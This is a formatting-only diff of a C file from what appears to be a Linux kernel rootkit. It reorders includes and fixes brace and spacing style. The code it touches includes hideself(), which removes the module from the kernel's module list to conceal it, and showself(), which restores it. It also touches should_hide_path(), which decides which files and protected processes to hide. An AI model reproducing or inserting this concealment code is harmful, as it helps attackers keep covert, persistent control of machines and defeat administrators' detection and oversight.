@@ -1,8 +1,8 @@
 #include "inc/util.h"
 #include "inc/cmds.h"
 
-#include <linux/fdtable.h>
 #include <linux/dcache.h>
+#include <linux/fdtable.h>
 #include <linux/module.h>
 #include <linux/slab.h>
 
@@ -27,9 +27,9 @@ void print_debug(const char *caller, char *msg, ...) {
   kfree(fmt);
 }
 
-bool should_hide_path(struct path *p){
+bool should_hide_path(struct path *p) {
   /*
-   
+
    * is_path_hidden(): checks if the path is hidden (see cmds/hide.c)
    * is_path_protected(): checks if the path belongs to a protected process (see cmds/protect.c)
    * is_cmd_path(): checks if path belongs to our command interface (see cmds.c)
@@ -82,15 +82,15 @@ uint64_t inode_from_sock(struct sock *sk) {
 
 struct list_head *prev_module = NULL;
 
-void hideself(void){
-  if(SHRK_DEBUG)
+void hideself(void) {
+  if (SHRK_DEBUG)
     return;
 
   prev_module = THIS_MODULE->list.prev;
   list_del(&THIS_MODULE->list);
 }
 
-void showself(void){
-  if(NULL != prev_module)
+void showself(void) {
+  if (NULL != prev_module)
     list_add(&THIS_MODULE->list, prev_module);
 }
